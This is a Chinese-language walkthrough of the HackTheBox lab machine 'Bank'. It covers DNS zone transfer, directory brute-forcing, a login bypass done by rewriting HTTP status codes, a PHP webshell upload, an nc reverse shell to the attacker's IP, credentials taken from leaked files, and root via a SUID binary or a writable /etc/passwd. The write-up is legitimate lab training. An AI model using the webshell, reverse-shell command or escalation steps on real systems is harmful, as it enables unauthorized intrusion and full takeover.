<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bank</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bank</h1><br/><p><img src="images/3-1.png" alt="images/3-1.png" /></p><p><h3>枚举DNS来发现域名，配置域名与IP的映射后即可访问站点，使用gobuster扫描web系统的隐藏目录。</h3></p><p><h3>通过修改HTTP状态码绕过登录进入系统，并在support.php界面上传webshell；或者利用系统的信息泄露，在/balance-transfer中找到正确的用户名和密码登录系统，然后上传webshell。</h3></p><p><h3>提权时可以利用系统中的SUID文件emergency，通过运行文件得到root权限；另一种方法是利用/etc/passwd文件有写入权限，直接追加一名拥有root权限的用户。</h3></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p>	◇ <a href="Nibbles_9.html#h1-1">信息收集</a></p><p>		▪ <a href="Nibbles_9.html#h2-1">53/TCP</a></p><p>		▪ <a href="Nibbles_9.html#h2-2">80/TCP</a></p><p>	◇ <a href="Nibbles_9.html#h1-2">Shell as www-data</a></p><p>		▪ <a href="Nibbles_9.html#h2-3">修改响应状态码绕过登录凭据</a></p><p>		▪ <a href="Nibbles_9.html#h2-4">用户名口令登录后台获取上传点</a></p><p>	◇ <a href="Nibbles_9.html#h1-3">Shell as root</a></p><p>		▪ <a href="Nibbles_9.html#h2-5">SUID emergency提权</a></p><p>		▪ <a href="Nibbles_9.html#h2-6">/etc/passwd 写入用户提权</a></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p><h1>信息收集</h1><a name="h1-1"></a></p><p><div class="codebox"><pre>nmap -sC -sV -p- -oA nmap 10.10.10.29</pre></div></p><p>当扫描完成时，我们可以看到这一情况</p><p><div class="codebox"><pre>PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)<br />|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)<br />|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)<br />53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)<br />| dns-nsid: <br />|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu<br />80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre></div></p><p>尝试先从80端口的Apache入手</p><p><img src="images/3-2.png" alt="images/3-2.png" /></p><p>只有一个默认首页，所以尝试爆破web目录看是否有其他切入点</p><p><div class="codebox"><pre>gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o gobuster</pre></div></p><p>相比Beep的扫描，增加了一个-o，目的是为了输出扫描结果</p><p>执行完也没有发现其他目录，只有一个/server-status，状态还是403</p><p><h2>53/TCP</h2><a name="h2-1"></a></p><p>这个时候注意到nmap扫描结果中53端口对应的DNS服务使用了TCP协议，这意味着该DNS服务只用于区域传输</p><p><img src="images/3-3.png" alt="images/3-3.png" /></p><p>使用nslookup反向解析DNS，但是并没有得到结果</p><p><img src="images/3-4.png" alt="images/3-4.png" /></p><p>查看官方给出的walkthrough提示需要猜测出域名，即bank.htb，并且在使用nslookup正向解析DNS时证实了这一点</p><p><img src="images/3-5.png" alt="images/3-5.png" /></p><p>那么接下来需要去挖掘是否存在其他子域名，因为已知DNS使用区域传输，所以添加axfr参数</p><p><div class="codebox"><pre>dig axfr bank.htb @10.10.10.29</pre></div></p><p><img src="images/3-6.png" alt="images/3-6.png" /></p><p>得到子域名之后，就可以将其添加至/etc/hosts文件中，但是因为这里有DNS服务，我们可以直接添加IP地址到DNS客户机配置文件中，如下图所示</p><p><img src="images/3-7.png" alt="images/3-7.png" /></p><p>然后尝试ping域名，看是否配置成功</p><p><img src="images/3-8.png" alt="images/3-8.png" /></p><p><h2>80/TCP</h2><a name="h2-2"></a></p><p>发现成功后就可以访问该站点了，经过测试访问 www.bank.htb, ns.bank.htb, chris.bank.htb 显示的都是Apche的默认首页，可是 bank.htb 跳转至login界面，并且利用wappalyzer得知web使用php语言</p><p><img src="images/3-9.png" alt="images/3-9.png" /></p><p>尝试弱口令失败，注入也没有什么结果，使用gobuster扫描web目录，因为已经知道目标使用了php，所以这次再加上参数 -x</p><p><div class="codebox"><pre>gobuster dir -u http://bank.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php -o gobuster</pre></div></p><p>扫描结果：</p><p><img src="images/3-10.png" alt="images/3-10.png" /></p><p>一个一个挨着看吧</p><p><h1>Shell as www-data</h1><a name="h1-2"></a></p><p>有两种方法可以上传webshell</p><p><h2>修改响应状态码绕过登录凭据</h2><a name="h2-3"></a></p><p>/index.php</p><p>发现这个页面进行了重定向，但是发现其实该重定向页面的数据还是挺大的，并且存在很多代码</p><p><img src="images/3-11.png" alt="images/3-11.png" /></p><p>尝试修改response的状态码为200 Ok，可以看到页面未跳转至login.php，出现了一些其他数据，尽管暂时未找到什么有用的，但是修改状态码确实起了作用</p><p><img src="images/3-12.png" alt="images/3-12.png" /></p><p>/support.php</p><p>因为也是302重定向到login.php，所以用同样的方式修改状态码，得到了下面的页面</p><p><img src="images/3-13.png" alt="images/3-13.png" /></p><p>这里看上去能够上传一个webshell，但是每一次都需要修改响应包中的内容有些麻烦，因此我直接在burpsuite中写入了相应的规则</p><p><img src="images/3-14.png" alt="images/3-14.png" /></p><p>为了测试能否上传php文件，我先上传了一个php文件，命名为jim.php，内容如下</p><p><div class="codebox"><pre>&lt;?php echo system($_REQUEST[&quot;cmd&quot;]); ?&gt;</pre></div></p><p>但遗憾的是上传失败了，并且提示只能上传图片格式的文件，我又上传了内容相同的 jim.png ，可以看出确实上传成功了，点击 Click Here 知道了上传文件的路径</p><p><img src="images/3-15.png" alt="images/3-15.png" /></p><p>接下来尝试是否仅在前端验证，以及其他后缀名是否能够上传，经过测试，均不能上传，查看源代码寻找原因，发现提示了一句</p><p><img src="images/3-16.png" alt="images/3-16.png" /></p><p>在debug中添加了.htb格式，可以当作.php执行，那么上传.htb格式的代码，发现上传成功且能够执行命令</p><p><img src="images/3-17.png" alt="images/3-17.png" /></p><p>然后利用nc把shell反弹给kali</p><p>web执行：</p><p><a href="http://bank.htb/uploads/jim.htb?cmd=nc%20-e%20/bin/bash%2010.10.16.12%209091">http://bank.htb/uploads/jim.htb?cmd=nc -e /bin/bash 10.10.*/* 9091</a></p><p>kali监听：</p><p><img src="images/3-18.png" alt="images/3-18.png" /></p><p><h2>用户名口令登录后台获取上传点</h2><a name="h2-4"></a></p><p>/balance-transfer显示如下</p><p><img src="images/3-19.png" alt="images/3-19.png" /></p><p>打开任意一个acc文件查看，可以看到用户信息，但是已经加密，猜测可能是登录信息</p><p><img src="images/3-20.png" alt="images/3-20.png" /></p><p>使用wget下载所有acc文件，-r 采用递归</p><p><img src="images/3-21.png" alt="images/3-21.png" /></p><p>删除掉无用的文件</p><p><img src="images/3-22.png" alt="images/3-22.png" /></p><p>拿到这么多可能的用户信息，猜测如果存在未加密用户，文件大小比加密的要小很多，所以用 wc 统计一下文件的字数</p><p><img src="images/3-23.png" alt="images/3-23.png" /></p><p>然后再进行一个sort排序，再加上 -r 将结果颠倒</p><p><div class="codebox"><pre>wc -c *.acc | sort -r</pre></div></p><p><img src="images/3-24.png" alt="images/3-24.png" /></p><p>发现一个只有257字节的文件，打开可以看到邮箱和密码</p><p><img src="images/3-25.png" alt="images/3-25.png" /></p><p>成功登录后台，并在 support 处找到相同上传点，webshell上传与反弹shell方式类似，不在赘述</p><p><img src="images/3-26.png" alt="images/3-26.png" /></p><p><h1>Shell as root</h1><a name="h1-3"></a></p><p>在 /home/chris 目录中找到 user.txt</p><p><img src="images/3-27.png" alt="images/3-27.png" /></p><p>使用用户名口令登录mysql，在 ../inc/user.php 中发现数据库用户名密码</p><p><img src="images/3-28.png" alt="images/3-28.png" /></p><p>然后能够登录数据库</p><p><img src="images/3-29.png" alt="images/3-29.png" /></p><p>进而获取整个数据库</p><p><img src="images/3-30.png" alt="images/3-30.png" /></p><p>尝试能否用该用户名和密码使用ssh连接，并未成功！</p><p>上传linEnum来收集目标信息，在kali中使用python开启简易http服务</p><p><img src="images/3-31.png" alt="images/3-31.png" /></p><p>然后进入目标的 /tmp 目录下，即临时目录，使用 wget 下载对应脚本</p><p><img src="images/3-32.png" alt="images/3-32.png" /></p><p>下载好后执行该脚本，然后等待即可</p><p><img src="images/3-33.png" alt="images/3-33.png" /></p><p><h2>SUID emergency提权</h2><a name="h2-5"></a></p><p>suid中有emergency</p><p><img src="images/3-34.png" alt="images/3-34.png" /></p><p>尝试看看执行该文件会发生什么，发现直接提权至root，然后就可以去找root.txt了</p><p><img src="images/3-35.png" alt="images/3-35.png" /></p><p><h2>/etc/passwd 写入用户提权</h2><a name="h2-6"></a></p><p>发现 /etc/passwd 文件可写</p><p><img src="images/3-36.png" alt="images/3-36.png" /></p><p>尝试写入一个具有root权限的新用户，使用openssl生成一个unix标准密码</p><p><img src="images/3-37.png" alt="images/3-37.png" /></p><p>然后使用echo往 /etc/passwd 中追加一条用户信息，成功后切换至新添加用户，即可获得root权限</p><p><img src="images/3-38.png" alt="images/3-38.png" /></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
